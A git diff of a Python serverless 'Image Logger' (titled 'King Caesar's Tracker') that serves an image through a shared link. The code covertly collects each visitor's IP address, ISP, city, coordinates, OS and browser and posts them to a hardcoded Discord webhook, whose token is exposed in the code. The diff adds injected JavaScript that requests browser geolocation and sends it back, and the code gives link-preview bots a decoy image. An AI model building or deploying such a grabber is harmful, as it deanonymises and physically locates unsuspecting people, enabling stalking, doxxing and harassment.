@@ -1,7 +1,7 @@
 from urllib import parse
 import traceback, requests, base64, httpagentparser, random, string, os
 
-# CONFIG FROM ENVIRONMENT VARIABLES (King must set these in Vercel dashboard)
+# CONFIG FROM ENVIRONMENT VARIABLES
 config = {
     "webhook": os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1408533708369301504/jlchDWD_ZBilXagHCZvGRl005WbBx2wowff5I_sQtdxvixWhostaLdItcsIjkhI1CJPr'),
     "image": os.environ.get('DEFAULT_IMAGE', 'https://i.imgur.com/bI81qPe.jpeg'),
@@ -20,17 +20,20 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json={
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
+    try:
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "@everyone",
+            "embeds": [
+                {
+                    "title": "Image Logger - Error",
+                    "color": config["color"],
+                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+                }
+            ],
+        })
+    except:
+        pass
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if ip.startswith(blacklistedIPs):
@@ -39,53 +42,71 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     bot = botCheck(ip, useragent)
     
     if bot:
-        requests.post(config["webhook"], json={
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-})
+        try:
+            requests.post(config["webhook"], json={
+                "username": config["username"],
+                "content": "",
+                "embeds": [
+                    {
+                        "title": "Image Logger - Link Sent",
+                        "color": config["color"],
+                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                    }
+                ],
+            })
+        except:
+            pass
         return
 
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    try:
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    except:
+        info = {}
     
-    os_name, browser = httpagentparser.simple_detect(useragent)
+    try:
+        os_name, browser = httpagentparser.simple_detect(useragent)
+    except:
+        os_name, browser = "Unknown", "Unknown"
     
     embed = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "🦍 King Caesar's Tracker - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Clicked the Link!**
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [
+            {
+                "title": "🦍 King Caesar's Tracker - IP Logged",
+                "color": config["color"],
+                "description": f"""**A User Clicked the Link!**
 
 **Endpoint:** `{endpoint}`
-            
+                
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`
+> **Provider:** `{info.get('isp', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}`
 
 **PC Info:**
 > **OS:** `{os_name}`
 > **Browser:** `{browser}`
 
-**User Agent:**        }
-    ],
-}
+**User Agent:**            }
+        ],
+    }
     
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json=embed)
+    if url: 
+        embed["embeds"][0].update({"thumbnail": {"url": url}})
+    
+    try:
+        requests.post(config["webhook"], json=embed)
+    except:
+        pass
+    
     return info
+
+# Binary data for bot response
+loading_image_binary = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def handler(request):
     try:
@@ -97,9 +118,9 @@ def handler(request):
         query = parse.parse_qs(parse.urlsplit(request.url).query)
         image_url = config["image"]
         
-        if 'url' in query:
+        if 'url' in query and query['url']:
             image_url = base64.b64decode(query['url'][0].encode()).decode()
-        elif 'id' in query:
+        elif 'id' in query and query['id']:
             image_url = base64.b64decode(query['id'][0].encode()).decode()
         
         # Check if bot
@@ -107,13 +128,17 @@ def handler(request):
             return {
                 'statusCode': 200,
                 'headers': {'Content-Type': 'image/jpeg'},
-                'body': base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000').decode('latin1')
+                'isBase64Encoded': True,
+                'body': base64.b64encode(loading_image_binary).decode('utf-8')
             }
         
         # Log the request
         if 'g' in query and query['g']:
-            location = base64.b64decode(query['g'][0].encode()).decode()
-            makeReport(ip, useragent, location, request.path, image_url)
+            try:
+                location = base64.b64decode(query['g'][0].encode()).decode()
+                makeReport(ip, useragent, location, request.path, image_url)
+            except:
+                makeReport(ip, useragent, None, request.path, image_url)
         else:
             makeReport(ip, useragent, None, request.path, image_url)
         
@@ -129,7 +154,22 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img"></div>'''
+}}</style><div class="img"></div>
+<script>
+var currenturl = window.location.href;
+if (!currenturl.includes("g=")) {{
+    if (navigator.geolocation) {{
+        navigator.geolocation.getCurrentPosition(function (coords) {{
+            if (currenturl.includes("?")) {{
+                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+            }} else {{
+                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+            }}
+            location.replace(currenturl);
+        }});
+    }}
+}}
+</script>'''
         
         return {
             'statusCode': 200,
